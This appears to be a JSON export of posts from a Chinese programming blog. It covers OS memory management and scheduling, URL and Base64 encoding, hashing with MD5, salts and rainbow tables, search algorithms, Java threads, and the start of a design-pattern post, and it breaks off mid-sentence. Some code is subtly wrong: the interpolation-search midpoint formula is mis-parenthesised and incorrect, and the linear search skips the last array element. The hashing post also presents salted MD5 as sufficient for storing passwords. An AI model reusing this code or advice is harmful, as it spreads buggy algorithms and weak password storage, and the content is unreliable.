页式存储管理方案是一种用户视角内存与物理内存相分离的内存分配管理方案。在页式存储管理中，将程序的逻辑地址划分为固定大小的页（page），而物理内存划分为同样大小的帧，程序加载时，可以将任意一页放入内存中任意一个帧，这些帧不必连续，从而实现了离散分配。页式存储管理的优点是：没有外碎片（因为页的大小固定），但会产生内碎片（一个页可能填充不满）。 两者的不同点： 目的不同：分页是由于系统管理的需要而不是用户的需要，它是信息的物理单位；分段的目的是为了能更好地满足用户的需要，它是信息的逻辑单位，它含有一组其意义相对完整的信息； 大小不同：页的大小固定且由系统决定，而段的长度却不固定，由其所完成的功能决定； 地址空间不同： 段向用户提供二维地址空间；页向用户提供的是一维地址空间； 信息共享：段是信息的逻辑单位，便于存储保护和信息的共享，页的保护和共享受到限制； 内存碎片：页式存储管理的优点是没有外碎片（因为页的大小固定），但会产生内碎片（一个页可能填充不满）；而段式管理的优点是没有内碎片（因为段大小可变，改变段大小来消除内碎片）。但段换入换出时，会产生外碎片（比如4k的段换5k的段，会产生1k的外碎片）。 页面置换算法最佳置换算法OPT：只具有理论意义的算法，用来评价其他页面置换算法。置换策略是将当前页面中在未来最长时间内不会被访问的页置换出去。 先进先出置换算法FIFO：简单粗暴的一种置换算法，没有考虑页面访问频率信息。每次淘汰最早调入的页面。 最近最久未使用算法LRU：算法赋予每个页面一个访问字段，用来记录上次页面被访问到现在所经历的时间t，每次置换的时候把t值最大的页面置换出去(实现方面可以采用寄存器或者栈的方式实现)。 时钟算法clock(也被称为是最近未使用算法NRU)：页面设置一个访问位，并将页面链接为一个环形队列，页面被访问的时候访问位设置为1。页面置换的时候，如果当前指针所指页面访问为为0，那么置换，否则将其置为0，循环直到遇到一个访问为位0的页面。 改进型Clock算法：在Clock算法的基础上添加一个修改位，替换时根究访问位和修改位综合判断。优先替换访问位和修改位都是0的页面，其次是访问位为0修改位为1的页面。 LFU最少使用算法LFU：设置寄存器记录页面被访问次数，每次置换的时候置换当前访问次数最少的。 操作系统中进程调度策略 先来先服务调度算法FCFS：队列实现，非抢占，先请求CPU的进程先分配到CPU，可以作为作业调度算法也可以作为进程调度算法；按作业或者进程到达的先后顺序依次调度，对于长作业比较有利； 最短作业优先调度算法SJF：作业调度算法，算法从就绪队列中选择估计时间最短的作业进行处理，直到得出结果或者无法继续执行，平均等待时间最短，但难以知道下一个CPU区间长度；缺点：不利于长作业；未考虑作业的重要性；运行时间是预估的，并不靠谱 ； 优先级调度算法(可以是抢占的，也可以是非抢占的)：优先级越高越先分配到CPU，相同优先级先到先服务，存在的主要问题是：低优先级进程无穷等待CPU，会导致无穷阻塞或饥饿； 时间片轮转调度算法(可抢占的)：按到达的先后对进程放入队列中，然后给队首进程分配CPU时间片，时间片用完之后计时器发出中断，暂停当前进程并将其放到队列尾部，循环 ;队列中没有进程被分配超过一个时间片的CPU时间，除非它是唯一可运行的进程。如果进程的CPU区间超过了一个时间片，那么该进程就被抢占并放回就绪队列。 高相应比算法HRN：响应比=(等待时间+要求服务时间)/要求服务时间； 多级队列调度算法：将就绪队列分成多个独立的队列，每个队列都有自己的调度算法，队列之间采用固定优先级抢占调度。其中，一个进程根据自身属性被永久地分配到一个队列中。 多级反馈队列调度算法：目前公认较好的调度算法；设置多个就绪队列并为每个队列设置不同的优先级，第一个队列优先级最高，其余依次递减。优先级越高的队列分配的时间片越短，进程到达之后按FCFS放入第一个队列，如果调度执行后没有完成，那么放到第二个队列尾部等待调度，如果第二次调度仍然没有完成，放入第三队列尾部…。只有当前一个队列为空的时候才会去调度下一个队列的进程。与多级队列调度算法相比，其允许进程在队列之间移动：若进程使用过多CPU时间，那么它会被转移到更低的优先级队列；在较低优先级队列等待时间过长的进程会被转移到更高优先级队列，以防止饥饿发生。 进程同步有哪几种机制 原子操作、信号量机制、自旋锁管程、会合、分布式系统 虚拟内存内存的发展历程 没有内存抽象(单进程，除去操作系统所用的内存之外，全部给用户程序使用) —&gt; 有内存抽象（多进程，进程独立的地址空间，交换技术(内存大小不可能容纳下所有并发执行的进程)）—&gt; 连续内存分配(固定大小分区(多道程序的程度受限)，可变分区(首次适应，最佳适应，最差适应)，碎片) —&gt; 不连续内存分配（分段，分页，段页式，虚拟内存） 虚拟内存 虚拟内存允许执行进程不必完全在内存中。虚拟内存的基本思想是：每个进程拥有独立的地址空间，这个空间被分为大小相等的多个块，称为页(Page)，每个页都是一段连续的地址。这些页被映射到物理内存，但并不是所有的页都必须在内存中才能运行程序。当程序引用到一部分在物理内存中的地址空间时，由硬件立刻进行必要的映射；当程序引用到一部分不在物理内存中的地址空间时，由操作系统负责将缺失的部分装入物理内存并重新执行失败的命令。这样，对于进程而言，逻辑上似乎有很大的内存空间，实际上其中一部分对应物理内存上的一块(称为帧，通常页和帧大小相等)，还有一些没加载在内存中的对应在硬盘上，如图所示。注意，请求分页系统、请求分段系统和请求段页式系统都是针对虚拟内存的，通过请求实现内存与外存的信息置换。 由图可以看出，虚拟内存实际上可以比物理内存大。当访问虚拟内存时，会访问MMU（内存管理单元）去匹配对应的物理地址（比如图5的0，1，2）。如果虚拟内存的页并不存在于物理内存中（如图5的3,4），会产生缺页中断，从磁盘中取得缺的页放入内存，如果内存已满，还会根据某种算法将磁盘中的页换出。 虚拟内存的应用与优点虚拟内存很适合在多道程序设计系统中使用，许多程序的片段同时保存在内存中。当一个程序等待它的一部分读入内存时，可以把CPU交给另一个进程使用。虚拟内存的使用可以带来以下好处： 在内存中可以保留多个进程，系统并发度提高 解除了用户与内存之间的紧密约束，进程可以比内存的全部空间还大 颠簸颠簸本质上是指频繁的页调度行为，具体来讲，进程发生缺页中断，这时，必须置换某一页。然而，其他所有的页都在使用，它置换一个页，但又立刻再次需要这个页。因此，会不断产生缺页中断，导致整个系统的效率急剧下降，这种现象称为颠簸（抖动）。 内存颠簸的解决策略包括： 如果是因为页面替换策略失误，可以修改替换算法来解决这个问题； 如果是因为运行的程序太多，造成程序无法同时将所有频繁访问的页面调入内存，则要降低多道程序的数量； 否则，还剩下两个办法：终止该进程或增加物理内存容量。 局部性原理时间上的局部性：最近被访问的页在不久的将来还会被访问； 空间上的局部性：内存中被访问的页周围的页也很可能被访问。","categories":[],"tags":[{"name":"Operating Systems","slug":"Operating-Systems","permalink":"https://kayleh.top/tags/Operating-Systems/"}]},{"title":"encoding-algorithm","slug":"编码算法","date":"2020-06-18T16:53:22.000Z","updated":"2021-04-11T17:11:29.001Z","comments":true,"path":"encoding-algorithm/","link":"","permalink":"https://kayleh.top/encoding-algorithm/","excerpt":"编码算法","text":"编码算法 要学习编码算法，先来看一看什么是编码。 ASCII码就是一种编码，字母A的编码是十六进制的0x41，字母B是0x42，以此类推： 字母 ASCII编码 A 0x41 B 0x42 C 0x43 D 0x44 … … 因为ASCII编码最多只能有127个字符，要想对更多的文字进行编码，就需要用Unicode。而中文的中使用Unicode编码就是0x4e2d，使用UTF-8则需要3个字节编码： 汉字 Unicode编码 UTF-8编码 中 0x4e2d 0xe4b8ad 文 0x6587 0xe69687 编 0x7f16 0xe7bc96 码 0x7801 0xe7a081 … … … 因此，最简单的编码是直接给每个字符指定一个若干字节表示的整数，复杂一点的编码就需要根据一个已有的编码推算出来。 比如UTF-8编码，它是一种不定长编码，但可以从给定字符的Unicode编码推算出来。 URL编码URL编码是浏览器发送数据给服务器时使用的编码，它通常附加在URL的参数部分，例如： https://www.baidu.com/s?wd=%E4%B8%AD%E6%96%87 之所以需要URL编码，是因为出于兼容性考虑，很多服务器只识别ASCII字符。但如果URL中包含中文、日文这些非ASCII字符怎么办？不要紧，URL编码有一套规则： 如果字符是A~Z，a~z，0~9以及-、_、.、*，则保持不变； 如果是其他字符，先转换为UTF-8编码，然后对每个字节以%XX表示。 例如：字符中的UTF-8编码是0xe4b8ad，因此，它的URL编码是%E4%B8%AD。URL编码总是大写。 Java标准库提供了一个URLEncoder类来对任意字符串进行URL编码： 123456public class Main &#123; public static void main(String[] args) &#123; String encoded = URLEncoder.encode(\"中文!\", StandardCharsets.UTF_8); System.out.println(encoded); &#125;&#125; 上述代码的运行结果是%E4%B8%AD%E6%96%87%21，中的URL编码是%E4%B8%AD，文的URL编码是%E6%96%87，!虽然是ASCII字符，也要对其编码为%21。 和标准的URL编码稍有不同，URLEncoder把空格字符编码成+，而现在的URL编码标准要求空格被编码为%20，不过，服务器都可以处理这两种情况。 如果服务器收到URL编码的字符串，就可以对其进行解码，还原成原始字符串。Java标准库的URLDecoder就可以解码： 123456public class Main &#123; public static void main(String[] args) &#123; String decoded = URLDecoder.decode(\"%E4%B8%AD%E6%96%87%21\", StandardCharsets.UTF_8); System.out.println(decoded); &#125;&#125; 要特别注意：URL编码是编码算法，不是加密算法。URL编码的目的是把任意文本数据编码为%前缀表示的文本，编码后的文本仅包含A~Z，a~z，0~9，-，_，.，*和%，便于浏览器和服务器处理。 Base64编码URL编码是对字符进行编码，表示成%xx的形式，而Base64编码是对二进制数据进行编码，表示成文本格式。 Base64编码可以把任意长度的二进制数据变为纯文本，且只包含A~Z、a~z、0~9、+、/、=这些字符。它的原理是把3字节的二进制数据按6bit一组，用4个int整数表示，然后查表，把int整数用索引对应到字符，得到编码后的字符串。 举个例子：3个byte数据分别是e4、b8、ad，按6bit分组得到39、0b、22和2d： 123456789┌───────────────┬───────────────┬───────────────┐│ e4 │ b8 │ ad │└───────────────┴───────────────┴───────────────┘┌─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┐│1│1│1│0│0│1│0│0│1│0│1│1│1│0│0│0│1│0│1│0│1│1│0│1│└─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┘┌───────────┬───────────┬───────────┬───────────┐│ 39 │ 0b │ 22 │ 2d │└───────────┴───────────┴───────────┴───────────┘ 因为6位整数的范围总是0~63，所以，能用64个字符表示：字符A~Z对应索引0~25，字符a~z对应索引26~51，字符0~9对应索引52~61，最后两个索引62、63分别用字符+和/表示。 在Java中，二进制数据就是byte[]数组。Java标准库提供了Base64来对byte[]数组进行编解码： 1234567public class Main &#123; public static void main(String[] args) &#123; byte[] input = new byte[] &#123; (byte) 0xe4, (byte) 0xb8, (byte) 0xad &#125;; String b64encoded = Base64.getEncoder().encodeToString(input); System.out.println(b64encoded); &#125;&#125; 编码后得到5Lit4个字符。要对Base64解码，仍然用Base64这个类： 123456public class Main &#123; public static void main(String[] args) &#123; byte[] output = Base64.getDecoder().decode(\"5Lit\"); System.out.println(Arrays.toString(output)); // [-28, -72, -83] &#125;&#125; 有的童鞋会问：如果输入的byte[]数组长度不是3的整数倍肿么办？这种情况下，需要对输入的末尾补一个或两个0x00，编码后，在结尾加一个=表示补充了1个0x00，加两个=表示补充了2个0x00，解码的时候，去掉末尾补充的一个或两个0x00即可。 实际上，因为编码后的长度加上=总是4的倍数，所以即使不加=也可以计算出原始输入的byte[]。Base64编码的时候可以用withoutPadding()去掉=，解码出来的结果是一样的： 1234567891011public class Main &#123; public static void main(String[] args) &#123; byte[] input = new byte[] &#123; (byte) 0xe4, (byte) 0xb8, (byte) 0xad, 0x21 &#125;; String b64encoded = Base64.getEncoder().encodeToString(input); String b64encoded2 = Base64.getEncoder().withoutPadding().encodeToString(input); System.out.println(b64encoded); System.out.println(b64encoded2); byte[] output = Base64.getDecoder().decode(b64encoded2); System.out.println(Arrays.toString(output)); &#125;&#125; 因为标准的Base64编码会出现+、/和=，所以不适合把Base64编码后的字符串放到URL中。一种针对URL的Base64编码可以在URL中使用的Base64编码，它仅仅是把+变成-，/变成_： 123456789public class Main &#123; public static void main(String[] args) &#123; byte[] input = new byte[] &#123; 0x01, 0x02, 0x7f, 0x00 &#125;; String b64encoded = Base64.getUrlEncoder().encodeToString(input); System.out.println(b64encoded); byte[] output = Base64.getUrlDecoder().decode(b64encoded); System.out.println(Arrays.toString(output)); &#125;&#125; Base64编码的目的是把二进制数据变成文本格式，这样在很多文本中就可以处理二进制数据。例如，电子邮件协议就是文本协议，如果要在电子邮件中添加一个二进制文件，就可以用Base64编码，然后以文本的形式传送。 Base64编码的缺点是传输效率会降低，因为它把原始数据的长度增加了1/3。 和URL编码一样，Base64编码是一种编码算法，不是加密算法。 如果把Base64的64个字符编码表换成32个、48个或者58个，就可以使用Base32编码，Base48编码和Base58编码。字符越少，编码的效率就会越低。 小结URL编码和Base64编码都是编码算法，它们不是加密算法； URL编码的目的是把任意文本数据编码为%前缀表示的文本，便于浏览器和服务器处理； Base64编码的目的是把任意二进制数据编码为文本，但编码后数据量会增加1/3。","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"hash algorithm","slug":"哈希算法","date":"2020-06-17T02:03:58.000Z","updated":"2021-04-11T17:11:28.804Z","comments":true,"path":"hash-algorithm/","link":"","permalink":"https://kayleh.top/hash-algorithm/","excerpt":"哈希算法 哈希算法（Hash）又称摘要算法（Digest），它的作用是：对任意一组输入数据进行计算，得到一个固定长度的输出摘要。","text":"哈希算法 哈希算法（Hash）又称摘要算法（Digest），它的作用是：对任意一组输入数据进行计算，得到一个固定长度的输出摘要。 哈希算法最重要的特点就是： 相同的输入一定得到相同的输出； 不同的输入大概率得到不同的输出。 哈希算法的目的就是为了验证原始数据是否被篡改。 Java字符串的hashCode()就是一个哈希算法，它的输入是任意字符串，输出是固定的4字节int整数： 123&quot;hello&quot;.hashCode(); &#x2F;&#x2F; 0x5e918d2&quot;hello, java&quot;.hashCode(); &#x2F;&#x2F; 0x7a9d88e8&quot;hello, bob&quot;.hashCode(); &#x2F;&#x2F; 0xa0dbae2f 两个相同的字符串永远会计算出相同的hashCode，否则基于hashCode定位的HashMap就无法正常工作。这也是为什么当我们自定义一个class时，覆写equals()方法时我们必须正确覆写hashCode()方法。 哈希碰撞哈希碰撞是指，两个不同的输入得到了相同的输出： 12&quot;AaAaAa&quot;.hashCode(); &#x2F;&#x2F; 0x7460e8c0&quot;BBAaBB&quot;.hashCode(); &#x2F;&#x2F; 0x7460e8c0 有童鞋会问：碰撞能不能避免？答案是不能。碰撞是一定会出现的，因为输出的字节长度是固定的，String的hashCode()输出是4字节整数，最多只有4294967296种输出，但输入的数据长度是不固定的，有无数种输入。所以，哈希算法是把一个无限的输入集合映射到一个有限的输出集合，必然会产生碰撞。 碰撞不可怕，我们担心的不是碰撞，而是碰撞的概率，因为碰撞概率的高低关系到哈希算法的安全性。一个安全的哈希算法必须满足： 碰撞概率低； 不能猜测输出。 不能猜测输出是指，输入的任意一个bit的变化会造成输出完全不同，这样就很难从输出反推输入（只能依靠暴力穷举）。假设一种哈希算法有如下规律： 123hashA(&quot;java001&quot;) &#x3D; &quot;123456&quot;hashA(&quot;java002&quot;) &#x3D; &quot;123457&quot;hashA(&quot;java003&quot;) &#x3D; &quot;123458&quot; 那么很容易从输出123459反推输入，这种哈希算法就不安全。安全的哈希算法从输出是看不出任何规律的： 123hashB(&quot;java001&quot;) &#x3D; &quot;123456&quot;hashB(&quot;java002&quot;) &#x3D; &quot;580271&quot;hashB(&quot;java003&quot;) &#x3D; ??? 常用的哈希算法有： 算法 输出长度（位） 输出长度（字节） MD5 128 bits 16 bytes SHA-1 160 bits 20 bytes RipeMD-160 160 bits 20 bytes SHA-256 256 bits 32 bytes SHA-512 512 bits 64 bytes 根据碰撞概率，哈希算法的输出长度越长，就越难产生碰撞，也就越安全。 Java标准库提供了常用的哈希算法，并且有一套统一的接口。我们以MD5算法为例，看看如何对输入计算哈希： 1234567891011public class Main &#123; public static void main(String[] args) throws Exception &#123; // 创建一个MessageDigest实例: MessageDigest md = MessageDigest.getInstance(\"MD5\"); // 反复调用update输入数据: md.update(\"Hello\".getBytes(\"UTF-8\")); md.update(\"World\".getBytes(\"UTF-8\")); byte[] result = md.digest(); // 16 bytes: 68e109f0f40ca72a15e05cc22786f8e6 System.out.println(new BigInteger(1, result).toString(16)); &#125;&#125; 使用MessageDigest时，我们首先根据哈希算法获取一个MessageDigest实例，然后，反复调用update(byte[])输入数据。当输入结束后，调用digest()方法获得byte[]数组表示的摘要，最后，把它转换为十六进制的字符串。 运行上述代码，可以得到输入HelloWorld的MD5是68e109f0f40ca72a15e05cc22786f8e6。 哈希算法的用途因为相同的输入永远会得到相同的输出，因此，如果输入被修改了，得到的输出就会不同。 我们在网站上下载软件的时候，经常看到下载页显示的哈希： 如何判断下载到本地的软件是原始的、未经篡改的文件？我们只需要自己计算一下本地文件的哈希值，再与官网公开的哈希值对比，如果相同，说明文件下载正确，否则，说明文件已被篡改。 哈希算法的另一个重要用途是存储用户口令。如果直接将用户的原始口令存放到数据库中，会产生极大的安全风险： 数据库管理员能够看到用户明文口令； 数据库数据一旦泄漏，黑客即可获取用户明文口令。 不存储用户的原始口令，那么如何对用户进行认证？ 方法是存储用户口令的哈希，例如，MD5。 在用户输入原始口令后，系统计算用户输入的原始口令的MD5并与数据库存储的MD5对比，如果一致，说明口令正确，否则，口令错误。 因此，数据库存储用户名和口令的表内容应该像下面这样： username password bob f30aa7a662c728b7407c54ae6bfd27d1 alice 25d55ad283aa400af464c76d713c07ad tim bed128365216c019988915ed3add75fb 这样一来，数据库管理员看不到用户的原始口令。即使数据库泄漏，黑客也无法拿到用户的原始口令。想要拿到用户的原始口令，必须用暴力穷举的方法，一个口令一个口令地试，直到某个口令计算的MD5恰好等于指定值。 使用哈希口令时，还要注意防止彩虹表攻击。 什么是彩虹表呢？上面讲到了，如果只拿到MD5，从MD5反推明文口令，只能使用暴力穷举的方法。 然而黑客并不笨，暴力穷举会消耗大量的算力和时间。但是，如果有一个预先计算好的常用口令和它们的MD5的对照表： 常用口令 MD5 hello123 f30aa7a662c728b7407c54ae6bfd27d1 12345678 25d55ad283aa400af464c76d713c07ad passw0rd bed128365216c019988915ed3add75fb 19700101 570da6d5277a646f6552b8832012f5dc … … 20201231 6879c0ae9117b50074ce0a0d4c843060 这个表就是彩虹表。如果用户使用了常用口令，黑客从MD5一下就能反查到原始口令： bob的MD5：f30aa7a662c728b7407c54ae6bfd27d1，原始口令：hello123； alice的MD5：25d55ad283aa400af464c76d713c07ad，原始口令：12345678； tim的MD5：bed128365216c019988915ed3add75fb，原始口令：passw0rd。 这就是为什么不要使用常用密码，以及不要使用生日作为密码的原因。 即使用户使用了常用口令，我们也可以采取措施来抵御彩虹表攻击，方法是对每个口令额外添加随机数，这个方法称之为加盐（salt）： 1digest &#x3D; md5(salt+inputPassword) 经过加盐处理的数据库表，内容如下： username salt password bob H1r0a a5022319ff4c56955e22a74abcc2c210 alice 7$p2w e5de688c99e961ed6e560b972dab8b6a tim z5Sk9 1eee304b92dc0d105904e7ab58fd2f64 加盐的目的在于使黑客的彩虹表失效，即使用户使用常用口令，也无法从MD5反推原始口令。 SHA-1SHA-1也是一种哈希算法，它的输出是160 bits，即20字节。SHA-1是由美国国家安全局开发的，SHA算法实际上是一个系列，包括SHA-0（已废弃）、SHA-1、SHA-256、SHA-512等。 在Java中使用SHA-1，和MD5完全一样，只需要把算法名称改为&quot;SHA-1&quot;： 1234567891011public class Main &#123; public static void main(String[] args) throws Exception &#123; // 创建一个MessageDigest实例: MessageDigest md = MessageDigest.getInstance(\"SHA-1\"); // 反复调用update输入数据: md.update(\"Hello\".getBytes(\"UTF-8\")); md.update(\"World\".getBytes(\"UTF-8\")); byte[] result = md.digest(); // 20 bytes: db8ac1c259eb89d4a131b253bacfca5f319d54f2 System.out.println(new BigInteger(1, result).toString(16)); &#125;&#125; 类似的，计算SHA-256，我们需要传入名称&quot;SHA-256&quot;，计算SHA-512，我们需要传入名称&quot;SHA-512&quot;。Java标准库支持的所有哈希算法可以在这里查到。","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"interpolation-search-algorithm","slug":"插值查找算法","date":"2020-06-16T17:18:21.000Z","updated":"2021-04-11T17:11:28.890Z","comments":true,"path":"interpolation-search-algorithm/","link":"","permalink":"https://kayleh.top/interpolation-search-algorithm/","excerpt":"插值查找算法","text":"插值查找算法 12345678910111213141516171819202122232425262728293031323334/** * @Author: Wizard * @Date: 2020/6/17 9:06 */public class insertSearch &#123; /** * @param arr 数组 * @param left 左边的索引 * @param right 右边的索引 * @param findVal 要查找的值 * @return */ public static int insertValue(int[] arr, int left, int right, int findVal) &#123; System.out.println(\"插值查找次数...\"); //注意：findVal&lt;arr[0]和findVal&gt;arr[arr.length-1]必须需要 //否则得到的mid可能越界 if (left &gt; right || findVal &lt; arr[0] || findVal &gt; arr[arr.length - 1]) &#123; return -1; &#125; //求出mid,自适应 int mid = left + (right - left) * (findVal - arr[left] / arr[right] - arr[left]); int midVal = arr[mid]; if (findVal &gt; midVal) &#123; //应该向右递归 return insertValue(arr, mid + 1, right, findVal); &#125; else if (findVal &lt; midVal) &#123; return insertValue(arr, left, mid - 1, findVal); &#125; else &#123; return mid; &#125; &#125;&#125;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"binary-search-algorithm","slug":"二分查找算法","date":"2020-06-16T17:04:50.000Z","updated":"2021-04-11T17:11:28.567Z","comments":true,"path":"binary-search-algorithm/","link":"","permalink":"https://kayleh.top/binary-search-algorithm/","excerpt":"二分查找算法","text":"二分查找算法 12345678910111213141516171819202122232425/** * 二分查找算法 * * @param arr 待查找的数组,arr是升序排序 * @param target 需要查找的数 * @return 返回对应的下标，-1表示没有 */ public static int binarySearch(int[] arr, int target) &#123; int left = 0; int right = arr.length - 1; while (left &lt;= right) &#123; //说明可以继续查找 int mid = (left + right) / 2; if (arr[mid] == target) &#123; return mid; &#125; else if (arr[mid] &gt; target) &#123; right = mid - 1;//需要向左边查找 &#125; else &#123; left = mid + 1;//需要向右边查找 &#125; &#125; return -1; &#125;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"linear-search-algorithm","slug":"线性查找算法","date":"2020-06-16T16:54:06.000Z","updated":"2021-04-11T17:11:28.986Z","comments":true,"path":"linear-search-algorithm/","link":"","permalink":"https://kayleh.top/linear-search-algorithm/","excerpt":"线性查找算法","text":"线性查找算法 有一个数列： {1,8, 10, 89, 1000, 1234} ，判断数列中是否包含此名称 【顺序查找】 要求: 如果找到了，就提示找到，并给出下标值。 12345678910111213141516171819/** * @Author: Wizard * @Date: 2020/6/17 8:57 */public class OrderSearch &#123; public static void main(String[] args) &#123; int[] arr = &#123;1, 8, 10, 89, 1000, 1234&#125;; System.out.println(OrderFind(arr, 10)); &#125; public static int OrderFind(int[] arr, int value) &#123; for (int i = 0; i &lt; arr.length - 1; i++) &#123; if (arr[i] == value) &#123; return i; &#125; &#125; return -1; &#125;&#125;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"多线程","slug":"多线程","date":"2020-06-14T17:13:04.000Z","updated":"2021-04-11T17:11:28.845Z","comments":true,"path":"multithreading/","link":"","permalink":"https://kayleh.top/multithreading/","excerpt":"多线程","text":"多线程 一个线程的生命周期线程是一个动态执行的过程，它也有一个从产生到死亡的过程。 下图显示了一个线程完整的生命周期。 新建状态: 使用 new 关键字和 Thread 类或其子类建立一个线程对象后，该线程对象就处于新建状态。它保持这个状态直到程序 start() 这个线程。 就绪状态: 当线程对象调用了start()方法之后，该线程就进入就绪状态。就绪状态的线程处于就绪队列中，要等待JVM里线程调度器的调度。 运行状态: 如果就绪状态的线程获取 CPU 资源，就可以执行 run()，此时线程便处于运行状态。处于运行状态的线程最为复杂，它可以变为阻塞状态、就绪状态和死亡状态。 阻塞状态: 如果一个线程执行了sleep（睡眠）、suspend（挂起）等方法，失去所占用资源之后，该线程就从运行状态进入阻塞状态。在睡眠时间已到或获得设备资源后可以重新进入就绪状态。可以分为三种： 等待阻塞：运行状态中的线程执行 wait() 方法，使线程进入到等待阻塞状态。 同步阻塞：线程在获取 synchronized 同步锁失败(因为同步锁被其他线程占用)。 其他阻塞：通过调用线程的 sleep() 或 join() 发出了 I/O 请求时，线程就会进入到阻塞状态。当sleep() 状态超时，join() 等待线程终止或超时，或者 I/O 处理完毕，线程重新转入就绪状态。 死亡状态: 一个运行状态的线程完成任务或者其他终止条件发生时，该线程就切换到终止状态。 线程的优先级每一个 Java 线程都有一个优先级，这样有助于操作系统确定线程的调度顺序。 Java 线程的优先级是一个整数，其取值范围是 1 （Thread.MIN_PRIORITY ） - 10 （Thread.MAX_PRIORITY ）。 默认情况下，每一个线程都会分配一个优先级 NORM_PRIORITY（5）。 具有较高优先级的线程对程序更重要，并且应该在低优先级的线程之前分配处理器资源。但是，线程优先级不能保证线程执行的顺序，而且非常依赖于平台。 创建一个线程Java 提供了三种创建线程的方法： 通过实现 Runnable 接口； 通过继承 Thread 类本身； 通过 Callable 和 Future 创建线程。 通过实现 Runnable 接口来创建线程创建一个线程，最简单的方法是创建一个实现 Runnable 接口的类。 为了实现 Runnable，一个类只需要执行一个方法调用 run()，声明如下： 1public void run() 你可以重写该方法，重要的是理解的 run() 可以调用其他方法，使用其他类，并声明变量，就像主线程一样。 在创建一个实现 Runnable 接口的类之后，你可以在类中实例化一个线程对象。 Thread 定义了几个构造方法，下面的这个是我们经常使用的： 1Thread(Runnable threadOb,String threadName); 这里，threadOb 是一个实现 Runnable 接口的类的实例，并且 threadName 指定新线程的名字。 新线程创建之后，你调用它的 start() 方法它才会运行。 1void start(); 下面是一个创建线程并开始让它执行的实例： 编译以上程序运行结果如下： 12345678910111213141516Creating Thread-1Starting Thread-1Creating Thread-2Starting Thread-2Running Thread-1Thread: Thread-1, 4Running Thread-2Thread: Thread-2, 4Thread: Thread-1, 3Thread: Thread-2, 3Thread: Thread-1, 2Thread: Thread-2, 2Thread: Thread-1, 1Thread: Thread-2, 1Thread Thread-1 exiting.Thread Thread-2 exiting. 通过继承Thread来创建线程创建一个线程的第二种方法是创建一个新的类，该类继承 Thread 类，然后创建一个该类的实例。 继承类必须重写 run() 方法，该方法是新线程的入口点。它也必须调用 start() 方法才能执行。 该方法尽管被列为一种多线程实现方式，但是本质上也是实现了 Runnable 接口的一个实例。 编译以上程序运行结果如下： 12345678910111213141516Creating Thread-1Starting Thread-1Creating Thread-2Starting Thread-2Running Thread-1Thread: Thread-1, 4Running Thread-2Thread: Thread-2, 4Thread: Thread-1, 3Thread: Thread-2, 3Thread: Thread-1, 2Thread: Thread-2, 2Thread: Thread-1, 1Thread: Thread-2, 1Thread Thread-1 exiting.Thread Thread-2 exiting. Thread 方法下表列出了Thread类的一些重要方法： 序号 方法描述 1 public void start() 使该线程开始执行；Java 虚拟机调用该线程的 run 方法。 2 public void run() 如果该线程是使用独立的 Runnable 运行对象构造的，则调用该 Runnable 对象的 run 方法；否则，该方法不执行任何操作并返回。 3 public final void setName(String name) 改变线程名称，使之与参数 name 相同。 4 public final void setPriority(int priority) 更改线程的优先级。 5 public final void setDaemon(boolean on) 将该线程标记为守护线程或用户线程。 6 public final void join(long millisec) 等待该线程终止的时间最长为 millis 毫秒。 7 public void interrupt() 中断线程。 8 public final boolean isAlive() 测试线程是否处于活动状态。 测试线程是否处于活动状态。 上述方法是被Thread对象调用的。下面的方法是Thread类的静态方法。 序号 方法描述 1 public static void yield() 暂停当前正在执行的线程对象，并执行其他线程。 2 public static void sleep(long millisec) 在指定的毫秒数内让当前正在执行的线程休眠（暂停执行），此操作受到系统计时器和调度程序精度和准确性的影响。 3 public static boolean holdsLock(Object x) 当且仅当当前线程在指定的对象上保持监视器锁时，才返回 true。 4 public static Thread currentThread() 返回对当前正在执行的线程对象的引用。 5 public static void dumpStack() 将当前线程的堆栈跟踪打印至标准错误流。 实例如下的ThreadClassDemo 程序演示了Thread类的一些方法： 运行结果如下，每一次运行的结果都不一样。 1234567891011121314Starting hello thread...Starting goodbye thread...HelloHelloHelloHelloHelloHelloGoodbyeGoodbyeGoodbyeGoodbyeGoodbye....... 通过 Callable 和 Future 创建线程 创建 Callable 接口的实现类，并实现 call() 方法，该 call() 方法将作为线程执行体，并且有返回值。 创建 Callable 实现类的实例，使用 FutureTask 类来包装 Callable 对象，该 FutureTask 对象封装了该 Callable 对象的 call() 方法的返回值。 使用 FutureTask 对象作为 Thread 对象的 target 创建并启动新线程。 调用 FutureTask 对象的 get() 方法来获得子线程执行结束后的返回值。 创建线程的三种方式的对比 采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。 使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。 多线程的使用有效利用多线程的关键是理解程序是并发执行而不是串行执行的。例如：程序中有两个子系统需要并发执行，这时候就需要利用多线程编程。 通过对多线程的使用，可以编写出非常高效的程序。不过请注意，如果你创建太多的线程，程序执行的效率实际上是降低了，而不是提升了。 请记住，上下文的切换开销也很重要，如果你创建了太多的线程，CPU 花费在上下文的切换的时间将多于执行程序的时间！","categories":[],"tags":[{"name":"Concurrency","slug":"Concurrency","permalink":"https://kayleh.top/tags/Concurrency/"}]},{"title":"模板方法","slug":"模板方法","date":"2020-06-13T01:22:53.000Z","updated":"2021-04-11T17:11:28.933Z","comments":true,"path":"template-method/","link":"","permalink":"https://kayleh.top/template-method/","excerpt":"模板方法 定义一个操作中的算法的骨架，而将一些步骤延迟到子类中，使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。","text":"模板方法 定义一个操作中的算法的骨架，而将一些步骤延迟到子类中，使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。 在模板模式（Template 